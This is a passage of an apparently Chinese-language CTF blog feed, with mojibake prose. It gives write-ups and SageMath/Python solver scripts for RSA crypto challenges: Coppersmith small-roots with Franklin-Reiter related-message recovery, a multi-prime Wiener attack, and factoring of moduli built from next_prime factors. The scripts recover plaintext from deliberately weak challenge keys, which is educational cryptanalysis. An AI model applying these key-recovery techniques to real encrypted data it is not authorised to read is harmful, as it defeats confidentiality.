·æ±‚è§£å‡ºæ¥çš„å¯èƒ½æ€§æ‰é«˜. è€Œbetaä¸€èˆ¬0.4~0.6å°±è¡Œäº†.</strong></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç®—Mäº†, è¿™ä¸ªåˆæ˜¯å¦å¤–ä¸€ä¸ªmethod - Franklin-Reiter related-message attack</p><h2 id="Franklin-Reiter-related-message-attack"><a href="#Franklin-Reiter-related-message-attack" class="headerlink" title="Franklin-Reiter related-message attack"></a>Franklin-Reiter related-message attack</h2><p>å…ˆæ¥çœ‹çœ‹wikiä¸Šæ€ä¹ˆè¯´<br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-1cca0e9bc4784a4c87a66851ebbedb15.png" alt="å›¾ç‰‡.png"><br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-3bb6344f8b434ae284b5e306dad19abb.png" alt="å›¾ç‰‡.png"><br>é€šä¿—ä¸€ç‚¹å°±æ˜¯, å½“ä¸¤ä¸ªæ˜æ–‡æ»¡è¶³çº¿æ€§å…³ç³»$M_2 = aM_1+b$çš„æ—¶å€™,$x - M_2$æ˜¯ä¸¤ä¸ªæ–¹ç¨‹<br>$$<br>g_1(x) = f(x)^e - C_1 \ (mod \ N) \<br>g_2(x) = x^e - C_2 \ (mod \ N)<br>$$<br>çš„ä¸€ä¸ªå…¬å› å¼, å› æ­¤å¯ä»¥åˆ©ç”¨åœ¨å¤šé¡¹å¼çš„æ¬§å‡ é‡Œå¾—ç®—æ³•ç®—å‡ºè¿™ä¸ªå…¬å› å¼$x - M_2$, ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦ç®—çš„M</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = PRx.gen() </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + diff)**e - C2</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾—è½¬ç›¸é™¤æ³•æ±‚å…¬å› å¼</span></span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"></span><br><span class="line">g = g1.monic()</span><br><span class="line"><span class="comment"># g = xn + 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338855507056808173780823100612346393533355160251650215111996263513671265306614427524745781162849613136748611330041590288489365015322686961617690785110909682202890569108842866175345662756188830323253136519607</span></span><br><span class="line">M = -g[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>Mç®—å‡ºæ¥äº†åˆ«å¿˜äº†é™¤ä¸€ä¸ª2^64(ä¸€å¼€å§‹ä¸ºäº†æ–¹ä¾¿è®¡ç®—æ‰€ä»¥æŠŠmæ”¾å¤§äº†, è¿˜å¥½ä¸å½±å“è§£é¢˜, ä»¥ååšçš„æ—¶å€™è¦å°å¿ƒä¸ºäº†æ–¹ä¾¿è®¡ç®—å¯¼è‡´ç®—ä¸å‡ºæ ¹æ¥, æ‰€ä»¥æœ€åçš„ä»£ç æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">C1 = <span class="number">80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line">C2 = <span class="number">5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line">n = <span class="number">92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line">C1=(C1*<span class="number">2</span>**<span class="number">192</span>)%n</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">n1 = n</span><br><span class="line">PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line"> </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + y)**e - C2</span><br><span class="line"> </span><br><span class="line">q1 = g1.change_ring(PRZZ)</span><br><span class="line">q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line">h = h.univariate_polynomial()</span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"></span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">64</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">x = PRx.gen() </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + diff)**e - C2</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"></span><br><span class="line">g = g1.monic()</span><br><span class="line"></span><br><span class="line">M = -g[<span class="number">0</span>]</span><br><span class="line">h =<span class="built_in">hex</span>(M*inverse_mod(<span class="number">2</span>**<span class="number">64</span>,n))[<span class="number">2</span>:]</span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(h),<span class="number">2</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">int</span>(h[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = HITCTF2020&#123;dde65d8adf22b5e1a0c0c10eff23c24c&#125;Â¤ÃœZ[Ã¶Ã£Â…Â¯WÃ‡Ã®BA6#5Â‹Â~_Ã²Â± 0Ã‡Â·Ã¦Ã®</span></span><br></pre></td></tr></table></figure><blockquote><p>ä¸€ä¸‹å­å­¦äº†ä¸¤ä¸ªæ–¹æ³•å¥½çˆ½å•Š, åœ¨çœ‹åˆ°eå¾ˆå°çš„æ—¶å€™, ä¸€å®šè¦æƒ³èµ·coppersmithæ¥.<br>ä¸è¿‡è¿™äº›åº”è¯¥éƒ½ç®—æ˜¯åŸºç¡€çš„, ç‰¹åˆ«æ˜¯coppersmithçš„ä½¿ç”¨æ„Ÿè§‰è¿˜æœ‰å¾ˆå¤šå¾ˆæ·±å¥¥çš„åœ°æ–¹,</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å…³äºå‡ºå»ç©åªèƒ½åœ¨æ‰‹æœºä¸Šç”¨Sage Cell Serveråšé¢˜é‚£ä»¶äº‹&lt;br&gt;ä¹Ÿæ˜¯å¥½ä¹…æ²¡å†™åšå®¢äº†, åˆšå¥½å­¦ä¹ ä¸€ä¸‹coppersmith attack&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å…ˆæŠŠé¢˜ç›®æ”¾ä¸Šæ¥å§&lt;/p&gt;
&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="Coppersmith attack" scheme="http://tearsjin.github.io/tags/Coppersmith-attack/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2020 ç¥¥äº‘æ¯ Crypto</title>
    <link href="http://tearsjin.github.io/2020/11/23/writeup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://tearsjin.github.io/2020/11/23/writeup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2020-11-23T13:29:58.000Z</published>
    <updated>2021-04-06T09:30:26.050Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åªä¼šåšå¯†ç çš„èœé¸¡</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0x01-SimpleRSA"><a href="#0x01-SimpleRSA" class="headerlink" title="0x01 SimpleRSA"></a>0x01 SimpleRSA</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p, q, r = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">n = p * q * r</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = gmpy2.invert(d , phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">print(e, n)</span><br><span class="line">print(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 </span></span><br><span class="line"><span class="string">1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173</span></span><br><span class="line"><span class="string">1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>è¯´å®è¯è¿™é¢˜èƒ½åšå‡ºæ¥ä¹Ÿæ˜¯è¿æ°”å¥½â€¦<br>wienerè¿˜æ²¡æœ‰è‡ªå·±å¤ç°è¿‡, ä¸€ç›´éƒ½æ˜¯ç”¨ç°æˆçš„è„šæœ¬. è€Œè¿™æ¬¡çš„næ˜¯å¤šä¸ªç´ å› å­çš„, ä¹‹å‰çš„è„šæœ¬ä¸èƒ½ç”¨äº†. æœ¬æ¥æ˜¯æƒ³ç€å»å­¦ä¸€ä¸‹æ€ä¹ˆå¤ç°çš„, ç»“æœç›´æ¥æ‰¾åˆ°åŸé¢˜äº†(ç¥¥äº‘æ¯å¥½åƒæŒºå¤šéƒ½èƒ½æ‰¾åˆ°åŸé¢˜æˆ–è€…æ˜¯å¾ˆåƒçš„é¢˜çš„</p><p><a href="https://masterpessimistaa.wordpress.com/2017/11/24/asis-finals-ctf-2017-gracias-writeup/">è¿™æ˜¯æ‰¾åˆ°çš„åŸé¢˜çš„wp</a></p><p>ç›´æ¥æŠ„è„šæœ¬å°±èƒ½ç®—å‡ºdäº†, æ‰€ä»¥åˆ°åº•è¯¥æ€ä¹ˆå†™wienerå‘¢?</p><blockquote><p>å’•å’•å’•â€¦æœ‰ç©ºä¸€å®šå­¦ä¼šå®ƒ!</p></blockquote><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2text</span>(<span class="params">Hex</span>):</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">2</span>: Hex = <span class="string">&#x27;0&#x27;</span> + Hex</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [Hex[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2text</span>(<span class="params">Dec</span>):</span>  </span><br><span class="line">    Hex = <span class="built_in">hex</span>(Dec)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hex2text(Hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    m = <span class="number">12345</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    q0 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    list1 = continued_fraction(Integer(e) / Integer(n))</span><br><span class="line">    conv = list1.convergents()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> conv:</span><br><span class="line">        k = i.numerator()</span><br><span class="line">        q1 = i.denominator()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                d = r * q1 + s * q0</span><br><span class="line">                m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">                <span class="keyword">if</span> m1 == m:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        q0 = q1</span><br><span class="line">c = <span class="number">1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452</span></span><br><span class="line">e = <span class="number">1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679</span></span><br><span class="line">n = <span class="number">1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173</span></span><br><span class="line">d = wiener(e,n)</span><br><span class="line">print(dec2text(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-RSAssss"><a href="#0x02-RSAssss" class="headerlink" title="0x02 RSAssss"></a>0x02 RSAssss</h2><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * next_prime(p) * next_prime(q)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">cipher = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">print(n, cipher)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 </span></span><br><span class="line"><span class="string">3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>è´¹é©¬åˆ†è§£! æˆ‘æ€ä¹ˆä¼šæ²¡æƒ³åˆ°å‘¢, ä¸¤ä¸ªæ¥è¿‘çš„å› å­å°±å¯ä»¥ç”¨fermatäº†.<br>è¿™é¢˜ä¹Ÿæ˜¯è¿æ°”å¥½,åœ¨<a href="https://www.alpertron.com.ar/ECM.HTM">è¿™ä¸ªå¤§æ•°åˆ†è§£ç½‘ç«™</a>åå°è·‘äº†ä¸¤ä¸ªé’Ÿåˆ†å‡ºä¸¤åŠæ¥äº†(çœŸçš„æ˜¯æ²¡æ³¨æ„æ”¾åå°è·‘çš„</p><p>åˆ†å‡ºçš„ä¸¤åŠ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383</span><br><span class="line">x2 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079</span><br></pre></td></tr></table></figure><p>è€ƒè™‘åˆ°<code>np = next_prime(p)</code>æ‰€ä»¥på’Œnpä¸ä¼šç›¸å·®å¤ªè¿œ, å¯ä»¥æœ‰$np = p+a$ ä¸å¦¨å‡è®¾<br>$$<br>p&lt;p+a&lt;q&lt;q+b<br>$$</p><p>åˆå› ä¸ºp,qæ˜¯éšæœºç”Ÿæˆçš„ä¸¤ä¸ªå¤§ç´ æ•°, ä»–ä»¬ç›¸ç­‰çš„å¯èƒ½æ€§å¤ªä½. è€Œåˆ†å‡ºçš„x1, x2(x1&gt;x2)éå¸¸æ¥è¿‘, åˆ™x1,x2å¯èƒ½æœ‰çš„ç»„åˆæœ‰<br>$$<br>x_1 = p(q+b) \ x_2 = q(p+a)<br>$$<br>æˆ–è€…æ˜¯<br>$$<br>x_1 = pq \ x_2 = (p+a)(q+b)<br>$$<br>(å¯èƒ½è¿˜æœ‰æ²¡è€ƒè™‘åˆ°çš„?â€¦</p><p>é¦–å…ˆå°è¯•ç¬¬ä¸€ç§ç»„åˆ(ç›´æ¥ä¸­äº†<br>x1å’Œx2ç›¸å‡æœ‰<br>$$<br>x = x_1-x_2 = bp-aq<br>$$<br>æ¶ˆå…ƒ<br>$$<br>p = {x \over b} + {a \over b}q \<br>x_2 ={a \over v}q^2 + aq + {x \over b}q<br>$$</p><p>åˆ™å¯ä»¥æœ‰å…³äºqçš„äºŒæ¬¡æ–¹ç¨‹<br>$$<br>aq^2 + (ab + x)q - bx_2 = 0<br>$$</p><p>å› ä¸ºè§£æ˜¯æ•´æ•°, æ‰€ä»¥deltaåº”è¯¥ä¸ºå®Œå…¨å¹³æ–¹æ•°<br>$$<br>\Delta = (ab + x)^2 + 4abx_2<br>$$</p><p>æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å¯ä»¥çˆ†ç ´å‡ºa,b ä»è€Œè§£å‡ºq,å†è€Œå°±èƒ½æœ‰p,q+b , p+aäº†</p><p>(<del>æœ‰ä¸€ç‚¹ä¸æ˜ç™½å°±æ˜¯æŒ‰ç†æ¥è¯´a,båªæœ‰1ç»„?å¯èƒ½æ˜¯æˆ‘æ²¡è€ƒè™‘å‘¨åˆ°,è·‘å‡ºæ¥4ç»„a,b, å‘ç°åªæœ‰ç¬¬å››ç»„è·‘å‡ºæ¥çš„qæ˜¯çœŸæ­£çš„q(å…¶ä»–ä¸‰ç»„éƒ½æ˜¯kq), æ‰€ä»¥ç›´æ¥é‡‡ç”¨ç¬¬å››ç»„çš„qå’Œa,b</del></p><p>æƒ³æ˜ç™½äº†! å› ä¸ºäºŒæ¬¡é¡¹çš„ç³»æ•°æ˜¯a, å¦‚æœaçš„å› æ•°é‡Œé¢æœ‰å®Œå…¨å¹³æ–¹æ•°$k^2$, é‚£ä¹ˆå°±å¯èƒ½è§£å‡ºkqè¿™ä¸ªè§£äº†! </p><p>æ±‚å‡ºnçš„å››ä¸ªç´ å› å­ä¹‹åå¸¸è§„çš„RSAè§£å¯†å°±è¡Œäº†</p><p>ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot, gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257</span></span><br><span class="line">x1 = <span class="number">89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383</span></span><br><span class="line">x2 = <span class="number">89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079</span></span><br><span class="line"></span><br><span class="line">x = x1 - x2</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">        delta_sq = (x + a * b) ** <span class="number">2</span> + <span class="number">4</span> * a * b * x2</span><br><span class="line">        delta = iroot(delta_sq, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> delta[<span class="number">1</span>]:</span><br><span class="line">            p1 = (-(a * b + x) + delta[<span class="number">0</span>]) // (<span class="number">2</span> * a)</span><br><span class="line">            p2 = (-(a * b + x) - delta[<span class="number">0</span>]) // (<span class="number">2</span> * a)</span><br><span class="line">            <span class="keyword">if</span> p1 &gt; <span class="number">0</span> <span class="keyword">and</span> gcd(p1, n) != <span class="number">1</span>:</span><br><span class="line">                print(p1, a, b)</span><br><span class="line">            <span class="keyword">if</span> p2 &gt; <span class="number">0</span> <span class="keyword">and</span> gcd(p2, n) != <span class="number">1</span>:</span><br><span class="line">                print(p2, a, b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    result:</span></span><br><span class="line"><span class="string">    59509622824623675050066481062107171504849863374230362259884081452647743246974989796952759980519162117328441285479164180294347299033843912200899999033032168 1 1536</span></span><br><span class="line"><span class="string">    29754811412311837525033240531053585752424931687115181129942040726323871623487494898476379990259581058664220642739582090147173649516921956100449999516516084 2 768</span></span><br><span class="line"><span class="string">    14877405706155918762516620265526792876212465843557590564971020363161935811743747449238189995129790529332110321369791045073586824758460978050224999758258042 4 384</span></span><br><span class="line"><span class="string">    7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021 8 192</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021</span></span><br><span class="line">np = x2 // q</span><br><span class="line">nq = q + <span class="number">192</span></span><br><span class="line">p = np - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span 